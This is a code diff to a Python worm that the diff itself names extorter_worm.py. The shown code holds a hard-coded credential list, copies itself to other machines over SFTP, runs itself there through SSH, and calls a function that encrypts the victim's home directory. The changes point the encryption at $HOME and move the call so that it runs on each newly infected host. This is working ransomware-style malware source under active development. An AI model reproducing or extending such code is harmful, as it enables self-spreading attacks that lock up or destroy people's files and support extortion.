@@ -20,7 +20,7 @@ credList = [
 
 
 # Path of directory we want to encrypt
-ENCRYPT_PATH = "/home/linh/"
+ENCRYPT_PATH = os.getenv("HOME")
 
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
@@ -106,7 +106,7 @@ def spreadAndExecute(sshClient):
 	sftpClient.put("extorter_worm.py", "/tmp/extorter_worm.py")
 	sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")
 	sshClient.exec_command("python /tmp/extorter_worm.py 2> errors.txt")
-	downloadAndEncrypt(ENCRYPT_PATH)
+	#downloadAndEncrypt(ENCRYPT_PATH)
 
 	# This function takes as a parameter 
 	# an instance of the SSH class which
@@ -276,7 +276,8 @@ if len(sys.argv) < 2:
 	if isInfectedSystem() == True: 
 		sys.exit()
 	else:
-		markInfected()		
+		markInfected()
+		downloadAndEncrypt(ENCRYPT_PATH)	
 # TODO: Get the IP of the current system
 
 
